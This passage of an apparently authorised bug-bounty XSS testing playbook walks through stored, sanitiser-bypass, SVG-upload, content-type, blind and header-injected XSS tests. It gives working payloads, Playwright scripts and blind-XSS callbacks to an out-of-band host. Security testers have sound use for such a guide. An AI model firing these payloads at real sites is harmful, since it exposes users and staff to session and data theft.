  # 3. as A: the payload for that context (text position shown; attribute and script forms as in XSS-002, XSS-003)
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H 'Content-Type: application/json' -D "$D/save-payload.txt" -o /dev/null --data-binary @- <<'EOF'
  {"display_name":"xss006<img src=x onerror=alert(document.domain)>"}
  EOF
  # 4. as B, in the browser, on every page from step 2
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  for u in "$T/team/members" "$T/users/1042" "$T/activity" "$T/notifications"; do
    NODE_PATH="$(npm root -g)" node "$D/fire.js" "$u" "$D" "$E/accounts/B.headers" "${HDR[@]}"; sleep 1; done; cat "$D/dialog.txt"
  ```
  In a single-page application the HTML is built in the browser from JSON, so step 2 shows the marker raw in
  every API response and tells you nothing: go straight to steps 3 and 4. `fire.js` carries cookie sessions; for
  a token kept in web storage, log B in through the form inside the script before `goto`. When a field is
  length-limited, `<svg onload=alert(document.domain)>` is 35 characters.
- **Proof:** the save request as A, then `dialog.txt` showing the page B opened and the message `$H`, with the
  screenshot from B's session. Say what B is to A (teammate, another tenant, a public visitor, an administrator)
  and that B did nothing but open the page. Restore the field afterwards.
- **Not a finding when:** the dialog fires only on A's own settings or edit page (`self-xss`). The value is raw in
  an API response but the page inserts it as text (`textContent`, a framework binding). The tag renders (`<i>`
  shows italics) but no handler survives: HTML injection (`content-spoofing`). The value reaches an e-mail and
  not a web page: mail clients do not run script, so that is HTML injection in e-mail, low at best. Only a role
  that already controls every viewer can set the field (a workspace owner naming the workspace): many programmes
  answer that this role is trusted. The script runs inside a sandboxed frame or on a user-content host.
- **Escalate:** XSS-018 against B. A field shown on every page of every member (a display name in a header) is
  wormable: say so, do not demonstrate it. If the same field also appears in a tool only staff see, plant
  XSS-011. A field that needs CSRF to be set on the victim's own account turns the self-only case into a finding:
  CSR items.

### XSS-007 · The rich-text or Markdown renderer keeps a link scheme, attribute or tag that executes script

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018, or when the content is shown to administrators or to every member of a project |
| **Requires** | rich-text, two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #1212067, #1930763, #299728, #836649 |

- **Where:** comment, issue, wiki, description and chat editors; signatures and e-mail templates; product and
  profile descriptions; anything rendered after the Markdown step: mentions and issue references, custom emoji,
  autolinks, tables of contents built from headings, code-block language classes, diagram and maths blocks
  (Mermaid, PlantUML, KaTeX), link previews and embeds. Find the stored format in the save request: HTML,
  Markdown, or a JSON document (ProseMirror, Slate, Quill Delta, Lexical). With a JSON document the editor limits
  node types and attributes and the API frequently does not.
- **Test:** three layers fail separately. The Markdown-to-HTML step lets a URL scheme or a raw tag through. The
  sanitiser's allow-list contains something active: `href` with a script scheme, `srcdoc`, `formaction`, or
  `data-*` and `class` values that the application's own JavaScript acts on. A filter that runs after the
  sanitiser rebuilds HTML from attacker text by string concatenation. Use the preview endpoint for the loop, then
  confirm on the stored render, which may use a different pipeline.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-007"; mkdir -p "$D"
  cat > "$D/probe.md" <<'EOF'
  [l1](javascript:alert(document.domain))
  [l2](JaVaScRiPt:alert(document.domain))
  [l3](javascript&colon;alert(document.domain))
  [l4](<javascript:alert(document.domain)>)
  ![i1](x"onerror="alert(document.domain))
  ![i2](x "t" onerror=alert(document.domain))
  <img src=x onerror=alert(document.domain)>
  <details open ontoggle=alert(document.domain)>d1</details>
  <a href="javascript:alert(document.domain)">a1</a>
  <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
  <form><button formaction="javascript:alert(document.domain)">b1</button></form>
  <svg><a xlink:href="javascript:alert(document.domain)"><text y="20">s1</text></a></svg>
  <span data-toggle="tooltip" data-html="true" title="<img src=x onerror=alert(document.domain)>">t1</span>
  <a data-method="post" data-remote="true" data-confirm="xss007" href="/xss007">u1</a>
  EOF
  # the preview endpoint first: nothing is stored
  python3 -c 'import json,sys; print(json.dumps({"text": sys.stdin.read()}))' < "$D/probe.md" \
    | curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/markdown/preview" -H 'Content-Type: application/json' --data-binary @- \
    | tee "$D/preview.html" | grep -a -i -o -E '.{40}(javascript:|onerror|ontoggle|srcdoc|formaction|data-html|data-method).{40}'
  # a JSON document: forge the node the editor would never emit
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/tickets/4711/comments" -H 'Content-Type: application/json' -D "$D/save.txt" --data-binary @- <<'EOF'
  {"body":{"type":"doc","content":[{"type":"paragraph","content":[{"type":"text","text":"xss007",
   "marks":[{"type":"link","attrs":{"href":"javascript:alert(document.domain)"}}]}]}]}}
  EOF
  # store what survived as A, then load the page as B
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    await p.locator('a:has-text("xss007"), [href*="alert(document.domain)"]').first().click({ timeout: 3000 }).catch(() => {});   // links need one click
    await p.waitForTimeout(1500); await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$T/tickets/4711" "$D" "$E/accounts/B.headers" "${HDR[@]}"; cat "$D/dialog.txt"
  ```
- **Proof:** the stored body as A sent it, the HTML the server returns for it, and `dialog.txt` showing B's page
  and `$H`, with the screenshot. State the interaction: none, or one click on a link inside the comment.
- **Not a finding when:** the preview keeps the payload but the stored render removes it, or the reverse and only
  A ever sees the preview (`self-xss`). The content is rendered in a sandboxed `iframe` or on a separate
  user-content host. Harmless tags survive but nothing active does (`content-spoofing`). The `data-*` attribute
  survives but no script on the page reads it. The policy blocks the handler: go to XSS-015 before recording a
  negative, and note that some programmes still pay a reduced amount for the injection alone (#1804177, $2,000,
  is titled as having no policy bypass).
- **Escalate:** XSS-018. When the allow-list itself holds and the sanitiser is a known library, XSS-008 attacks
  its parser. Diagram and maths renderers have their own option injection and library bugs: CVE items, and PPL
  items where a diagram config is merged into an object.

### XSS-008 · The sanitiser's output turns into executable markup when the browser parses it again

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018, or when the content is shown to administrators or to every member of a project |
| **Requires** | rich-text, two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #1805899, #1805873, #2819573, #1024734 |

- **Where:** rich-text fields where XSS-007 found the allow-list sound. Mutation needs HTML that is parsed,
  cleaned, serialised and parsed again by a different parser or in a different place: a server-side sanitiser
  built on an HTML4 or XML parser (Nokogiri with libxml2, PHP `DOMDocument`, older Java and .NET libraries)
  feeding an HTML5 browser; DOMPurify output that the application then moves inside `<svg>`, `<math>`,
  `<table>`, `<select>` or `<title>`, edits with a regular expression, or assigns to `innerHTML` a second time;
  an editor (Trix, Quill, TinyMCE, CKEditor) that re-serialises pasted content. Identify the library and version
  first.
- **Test:** send fragments whose tree differs between the two parses. The families: an element that is raw text
  for one parser and markup for the other (`<noscript>` with scripting off against on, `<xmp>`, `<noembed>`,
  `<iframe>`, and `<style>` inside `<svg>` or `<math>`); foreign-content rules that move an element between the
  HTML, SVG and MathML namespaces; an attribute value holding the closing tag of the raw-text element around
  it. The sanitiser sees an inert attribute or text node; the browser sees an element with a handler.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-008"; mkdir -p "$D"
  grep -rhoE '.{0,50}(DOMPurify|dompurify|sanitize-html|sanitizeHtml|filterXSS|xss-filters|HtmlSanitizer|bleach).{0,50}' "$E/recon/$H/js/" | sort -u | head
  cat > "$D/vectors.txt" <<'EOF'
  <noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
  <svg><style><img src=x onerror=alert(2)></style></svg>
  <math><style><img src=x onerror=alert(3)></style></math>
  <svg></p><style><a id="</style><img src=x onerror=alert(4)>">
  <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(5)>
  <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=x&Tab;onerror=alert(6)&gt;">
  <xmp><p title="</xmp><img src=x onerror=alert(7)>"></xmp>
  <noembed><p title="</noembed><img src=x onerror=alert(8)>"></noembed>
  <iframe><p title="</iframe><img src=x onerror=alert(9)>"></iframe>
  EOF
  # one comment per vector as A: a vector that breaks the tree must not hide the next one
  n=0; while IFS= read -r v; do n=$((n+1))
    python3 -c 'import json,sys; print(json.dumps({"body_html": sys.argv[1]}))' "$v" \
      | curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/tickets/4711/comments" -H 'Content-Type: application/json' --data-binary @- -o "$D/save-$n.json"
    sleep 1; done < "$D/vectors.txt"
  # the sanitiser's output as served to B, before any browser touches it
  curl -sS "${HDR[@]}" $B "$T/api/v1/tickets/4711/comments" -o "$D/served.json"
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    fs.writeFileSync(`${dir}/dom.html`, await p.content());                    // the tree after the second parse
    fs.appendFileSync(`${dir}/dialog.txt`, 'DOMPurify ' + await p.evaluate(() => window.DOMPurify ? DOMPurify.version : 'not global') + '\n');
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$T/tickets/4711" "$D" "$E/accounts/B.headers" "${HDR[@]}"; cat "$D/dialog.txt"
  ```
  The number in the dialog names the vector. Save that one again with `alert(document.domain)` and rerun for the
  proof. Vectors 4 to 6 are published DOMPurify bypasses that current releases fix; they still work against an
  old pinned copy and against sanitisers that never had the fix.
- **Proof:** three artefacts side by side: the fragment A sent, the sanitiser output from `served.json` with no
  live handler in it (the payload sits inside an attribute value or a text node), and `dom.html` from B's
  browser with the live `<img onerror>`; then `dialog.txt` with `$H` and the screenshot. Name the library and
  version.
- **Not a finding when:** the vector fires only in A's editor before saving (`self-xss`). `served.json` already
  shows a live handler: that is an allow-list gap, report it under XSS-007, which is the simpler report. The
  library is old but none of the vectors fires here: an outdated version alone is closed (`known-cve`). The
  vector needs a browser other than current Chrome, Firefox or Safari.
- **Escalate:** XSS-018. A vector that passes the current release of a sanitiser is also a bug in that library:
  #1805899 and #1805873 were paid by the Internet Bug Bounty for the Rails sanitiser. Report the application
  finding to the programme first, and do not publish the vector.

### XSS-009 · An uploaded SVG is served inline from the application origin and runs its script

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018; Low when the file is served from a host that holds no session |
| **Requires** | upload, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #232174, #1276742, #3357808, #3008878 |

- **Where:** avatar, logo, favicon, attachment, image-in-comment and import uploads. For each, record the URL the
  file comes back from: the application host, a sibling subdomain, or a separate domain used only for user
  content.
- **Test:** SVG is an XML document. Opened as a top-level page with `Content-Type: image/svg+xml` and without
  `Content-Disposition: attachment`, its `<script>` runs in the serving origin. Inside `<img src>` it does not.
  So the question is whether the raw file URL can be opened directly, on which origin, with which headers; and,
  where the upload sanitises SVG, what the sanitiser misses.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-009"; mkdir -p "$D"
  cat > "$D/xss009.svg" <<'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="120" height="120">
    <rect width="120" height="120" fill="#4488aa"/>
    <script>alert(document.domain)</script>
  </svg>
  EOF
  curl -sS "${HDR[@]}" $A -F "file=@$D/xss009.svg;type=image/svg+xml" "$T/api/v1/avatar" | tee "$D/upload.json"
  #    .svg refused?   -F "file=@$D/xss009.svg;filename=xss009.png;type=image/svg+xml"     (check on the name only)
  #                    -F "file=@$D/xss009.svg;filename=xss009.svg;type=image/png"         (check on the declared type only)
  #                    -F "file=@$D/xss009.svg;filename=xss009.SVG;type=image/svg+xml"     (case-sensitive deny-list)
  #    script removed? <svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/></svg>
  #                    <svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;"/></foreignObject></svg>
  #                    <!DOCTYPE svg [<!ENTITY e "<script xmlns='http://www.w3.org/2000/svg'>alert(document.domain)</script>">]><svg xmlns="http://www.w3.org/2000/svg">&e;</svg>
  #                    a comment of a few kilobytes before <script>, for scanners that read only the head of the file
  URL="$T/uploads/avatars/xss009.svg"          # the file URL from upload.json
  curl -sS "${HDR[@]}" -D- -o /dev/null "$URL" | grep -iE '^(HTTP|content-type|content-disposition|content-security-policy|location)'
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"   # B.headers when the file URL needs a session
  ```
- **Proof:** the upload request, the response headers of the file URL (`image/svg+xml`, no attachment
  disposition, no sandbox policy), and `dialog.txt` showing that URL and `$H`, with the screenshot. Say how a
  victim reaches the raw URL: a link A sends, or "open image in new tab" from a page where the application
  shows it. Delete the file afterwards.
- **Not a finding when:** the file is answered with `Content-Disposition: attachment`, with
  `Content-Security-Policy: sandbox` or `script-src 'none'`, or after conversion to PNG. The dialog names a domain
  used only for user content, or a storage provider's host (`third-party`): script runs there and reaches nothing.
  The file URL is only ever used in `<img>` and cannot be opened directly (signed, single-use, or forced
  download). A sibling subdomain of the application is not the same origin: record it as a primitive for XSS-016
  instead of reporting it as XSS on the application.
- **Escalate:** XSS-018. A script-capable file on the application origin also satisfies `script-src 'self'`:
  XSS-015. The same upload, parsed on the server, is an XXE or SSR-008 candidate. Where the application inlines
  the SVG markup into its own pages, the script runs with no extra click and the report is a plain stored XSS.

### XSS-010 · Attacker-controlled bytes are served from the application origin as HTML because the content type is wrong, missing or request-controlled

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018; Low when the serving host holds no session |
| **Requires** | reflect\|upload, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #304098, #356586, #20720, #296094 |

- **Where:** two families. Uploads and downloads: a file whose response type is copied from the upload request,
  derived from the extension (`.html`, `.htm`, `.xhtml`, `.xml`, `.xsl`), absent, or changeable through a
  parameter on the download URL (`content_type=`, `type=`, `format=`, `disposition=inline`). Reflections in
  non-HTML endpoints: a JSON error that echoes the path or a parameter, a JSONP `callback`, an API route that
  answers `text/html` by default or when `.html` is appended.
- **Test:** the browser renders by the response headers, not by what the developer meant. Script runs when the
  response is `text/html`, `application/xhtml+xml`, `text/xml`, `application/xml` or `image/svg+xml`, is not an
  attachment, and comes from the application origin; or when `Content-Type` is absent or unparseable,
  `X-Content-Type-Options: nosniff` is absent, and the body starts with an HTML tag.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-010"; mkdir -p "$D"
  printf '<html><body><script>alert(document.domain)</script></body></html>' > "$D/xss010.html"
  printf '<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>' > "$D/xss010.xml"
  up() { curl -sS "${HDR[@]}" $A -F "file=@$D/$1;filename=$2;type=$3" "$T/api/v1/attachments"; echo "  <- $2 as $3"; sleep 1; }
  up xss010.html xss010.html     text/html          # stored and served as sent?
  up xss010.html xss010.png      text/html          # is the response type copied from the upload request?
  up xss010.html xss010.jpg.html image/jpeg         # is it derived from the last extension?
  up xss010.xml  xss010.xml      text/xml
  up xss010.html xss010          application/x-unknown-xss010     # no usable type at all: is it sniffed?
  URL="$T/attachments/8812/xss010.html"            # each file URL in turn
  curl -sS "${HDR[@]}" -D- -o /dev/null "$URL" | grep -iE '^(HTTP|content-type|content-disposition|x-content-type-options|content-security-policy)'
  # request-controlled type or disposition on the download endpoint
  for q in 'content_type=text/html' 'type=text/html' 'format=html' 'disposition=inline' 'content_disposition=inline' 'inline=1' 'download=0'; do
    curl -sS "${HDR[@]}" $A -D- -o /dev/null "$URL?$q" | grep -iE '^(content-type|content-disposition)' | tr -d '\r' | tr '\n' ' '; echo " <- $q"; sleep 1; done
  # reflection in an endpoint that is not meant to be a page
  curl -sS "${HDR[@]}" -D- --get --data-urlencode 'callback=<svg onload=alert(document.domain)>' "$T/api/v1/items" | grep -a -iE '^content-type|<svg onload'
  curl -sS "${HDR[@]}" -D- "$T/api/v1/items/xss010%3Csvg%20onload=alert(document.domain)%3E" | grep -a -iE '^content-type|<svg onload'
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url).catch(e => fs.appendFileSync(`${dir}/dialog.txt`, `no page (download?): ${e.message.split('\n')[0]}\n`));
    await p.waitForTimeout(4000); await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"
  ```
- **Proof:** the request that placed the bytes, the response headers of the URL the victim opens (the content
  type that made it a document), and `dialog.txt` with that URL and `$H`, plus the screenshot. Delete the files
  afterwards.
- **Not a finding when:** the type is `text/plain`, `application/json` or `application/octet-stream`: current
  Chrome, Firefox and Safari do not sniff those into HTML, whatever older write-ups about Internet Explorer say.
  `nosniff` is set and the type is not a document type. The response is an attachment or carries a sandbox
  policy. The host is a user-content domain or a storage provider (`third-party`). The file URL works only in A's
  own session or behind a signature bound to A (`self-xss`). The reflecting endpoint needs a header or a method
  that a link cannot send.
- **Escalate:** XSS-018. A file served with a script-compatible type from the application origin feeds XSS-015
  (`script-src 'self'`). A request-controlled `Content-Type` on a cacheable URL is a CCH item.

### XSS-011 · A field that staff read in a back-office tool executes our payload and calls back

| | |
|---|---|
| **Severity** | High standalone when the callback names a back-office origin of the target; Medium when the origin is a low-privilege internal viewer |
| **Requires** | user-content, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #135154, #948929, #874387, #724889 |

- **Where:** input that ends up in a tool you cannot see: support tickets and contact forms (name, company,
  subject, body, phone), feedback, abuse and bug-report forms, sign-up fields that fill a CRM or an admin user
  table, order notes and delivery addresses, verification and partner applications, refund or deletion reasons,
  pre-chat forms, the file name of an attachment. Forms that need no login count. Read the policy first: some
  programmes restrict blind XSS payloads or name the callback service to use.
- **Test:** store one payload per field that closes the common contexts and, when it runs, sends only
  `document.domain` and the path of the page to the callback host, with the field name in the host label. Record
  every plant. Then wait: these fire hours or weeks later, when a person opens the record.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-011"; mkdir -p "$D"
  ALIAS='replace-with-this-engagements-own-inbox@example.org'
  python3 - "$OOB" "$ALIAS" > "$D/body.json" <<'PY'
  import json, sys
  oob, alias = sys.argv[1], sys.argv[2]
  def pl(tag):   # closes the usual contexts, then reports only the origin and the path where it ran
      js = f"new Image().src='https://xss011-{tag}.{oob}/?d='+document.domain+'&p='+encodeURIComponent(location.pathname)"
      return f"xss011 '\"></textarea></title></script><img src=x onerror=\"{js}\">"
  print(json.dumps({"email": alias, **{f: pl(f) for f in ("name", "company", "subject", "message")}}))
  PY
  curl -sS "${HDR[@]}" -X POST "$T/api/v1/support/tickets" -H 'Content-Type: application/json' --data-binary @"$D/body.json" \
    -D "$D/plant-response.txt" -o /dev/null
  printf '%s\t%s\t%s\n' "$(date -u +%FT%TZ)" "POST /api/v1/support/tickets" "name company subject message" >> "$D/plants.tsv"
  #    a URL-only field (website, link):    javascript:new Image().src='https://xss011-url.OOB/?d='+document.domain   (OOB = the value of $OOB)
  #    an AngularJS back office:            {{constructor.constructor("new Image().src='https://xss011-ng.OOB/?d='+document.domain")()}}
  # every later session: read the interactsh log for hosts beginning xss011-
  ```
  One submission per form. Twenty tickets are spam to a support team and get the account closed.
- **Proof:** the callback as logged: the host label naming the field, `d=` holding the origin where the script
  ran, `p=` holding the path, the source address, `Referer` and `User-Agent`, and the time; next to it the
  `plants.tsv` row and the saved request that planted that field. Report as soon as it fires and tell the
  programme where the payload is stored, so that they can remove it.
- **Not a finding when:** the callback has no `d=` value: a link scanner, a mail gateway or a chat unfurler
  fetched a URL it found in the text, and no script ran. Only a DNS lookup arrived. `d=` is your own view of your
  own ticket (compare the source address and `p=`). `d=` is the vendor's shared host of a helpdesk or CRM
  product (`third-party`): the flaw is in that product unless the target's own customisation renders the field.
  `d=` is empty because the page is a sandboxed frame.
- **Escalate:** do not. The browser belongs to an employee and the page shows other customers' data: no cookies,
  no DOM or storage capture, no screenshot, no request with that session, no second-stage script. Describe what
  script in that origin could reach, from `d=` and `p=`, and let the programme confirm it. If the triager asks
  for more, ask what they permit first.

### XSS-012 · A request header value is stored and later rendered unencoded in a log viewer, session list or error tracker

| | |
|---|---|
| **Severity** | High standalone when the callback names a back-office origin of the target; None when only your own session list renders it |
| **Requires** | oob |
| **Excluded by** | self-xss |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #275518, #342976, #362702, #190016 |

- **Where:** no asset fact gates this item: every application receives these headers, and whether a person later
  reads them in an HTML tool cannot be seen from outside, so the callback is the only observation.
  `User-Agent`, `Referer`, `X-Forwarded-For` and `True-Client-IP` are the ones that get displayed: in audit
  logs, "active sessions" and login-history pages, fraud-review screens, ticket metadata, analytics panels and
  error trackers. Send them on the requests staff are most likely to look at: a failed login, a request that
  raises an error, the support form, sign-up, checkout.
- **Test:** append a callback payload to each header on a handful of such requests, record what was sent where,
  and wait. If the programme requires a specific `User-Agent`, keep it intact and append to it.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-012"; mkdir -p "$D"
  for i in "${!HDR[@]}"; do [ "${HDR[$i]}" = -A ] && UA="${HDR[$((i+1))]}"; done      # the programme's User-Agent, kept
  pl() { printf '%s' "\"><img src=x onerror=\"new Image().src='https://xss012-$1.$OOB/?d='+document.domain\">"; }
  # a failed login: security teams read these
  curl -sS "${HDR[@]}" -A "$UA $(pl ua-login)" -e "https://$H/$(pl ref-login)" -o /dev/null -w '%{http_code}\n' \
    -X POST "$T/login" --data-urlencode 'email=xss012@invalid.example' --data-urlencode 'password=x'
  # an error: error trackers keep the request headers
  curl -sS "${HDR[@]}" -A "$UA $(pl ua-404)" -o /dev/null -w '%{http_code}\n' "$T/xss012-$(date +%s)"
  # client-address headers, in a request of their own so that a rejection does not hide the results above
  curl -sS "${HDR[@]}" -H "X-Forwarded-For: $(pl xff)" -H "True-Client-IP: $(pl tcip)" -o /dev/null -w '%{http_code}\n' "$T/"
  printf '%s\t%s\n' "$(date -u +%FT%TZ)" "ua-login ref-login ua-404 xff tcip" >> "$D/plants.tsv"
  # the visible variant: does our own session or audit page print the header raw?
  curl -sS "${HDR[@]}" $A -A "$UA xss012v<i>\"'" -o /dev/null "$T/account"
  curl -sS "${HDR[@]}" $A "$T/account/sessions" | grep -a -o '.\{60\}xss012v.\{12\}'
  # every later session: read the interactsh log for hosts beginning xss012-
  ```
- **Proof:** the callback as logged, with the host label naming the header and the request, `d=` holding the
  origin where it ran, the source address and the time, next to the `plants.tsv` row. For the visible variant,
  the proof is another account (an organisation administrator viewing the members' audit log) seeing the dialog,
  shown as in XSS-006.
- **Not a finding when:** the header is echoed only in the immediate response to the request that carried it: a
  cross-site page cannot set the victim's `User-Agent` or `X-Forwarded-For`, so nobody but the sender is hit
  (`self-xss`), unless that response is cached. The sessions page shows the value only to the account that sent
  it. The callback has no `d=`: a log pipeline or URL scanner fetched the address. `d=` is a third-party
  error-tracking or analytics host: that vendor's flaw (`third-party`).
- **Escalate:** the same restraint as XSS-011: nothing further in a staff browser. A header reflected in a
  cacheable response is a CCH item. A header that organisation administrators see for all members is a
  member-to-administrator stored XSS: finish it with XSS-018 on our own accounts.

### XSS-013 · A URL-derived value reaches an HTML or code sink in front-end JavaScript

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018 |
| **Requires** | browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - DOM · CWE-79 |
| **Prior art** | #1549451, #146336, #868934, #767944 |

- **Where:** no asset fact gates this item: every application in the chapter ships JavaScript, and the test needs
  only the bundles in `$E/recon/$H/js/` and a browser. Sources: `location.hash`, `location.search`,
  `location.href`, `document.URL`, `document.referrer`, `window.name`, `URLSearchParams`, a router's query and
  route parameters, and web-storage values first written from the URL. Sinks: `innerHTML`, `outerHTML`,
  `insertAdjacentHTML`, `document.write`, jQuery `$()`, `.html()`, `.append()` and `.after()`, `eval`,
